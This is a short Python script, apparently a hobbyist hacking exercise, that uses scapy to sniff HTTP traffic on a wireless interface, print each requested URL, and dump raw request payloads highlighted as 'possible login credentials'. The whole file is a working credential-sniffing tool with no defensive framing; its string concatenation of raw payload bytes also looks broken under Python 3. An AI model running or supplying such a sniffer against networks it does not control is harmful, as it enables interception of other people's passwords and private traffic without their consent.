import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    url = host+path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        p = packet[scapy.Raw].load
        return p

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTPRequest >> " + url)

        p = get_login_info(packet)
        if p:
            print('\x1b[6;30;42m' + '\n\n[+] Possible login credentials >> ' + p + '\n\n' + '\x1b[0m')
            #print("\n\n[+] Possible login credentials >> " + p)

sniff("wlp1s0")


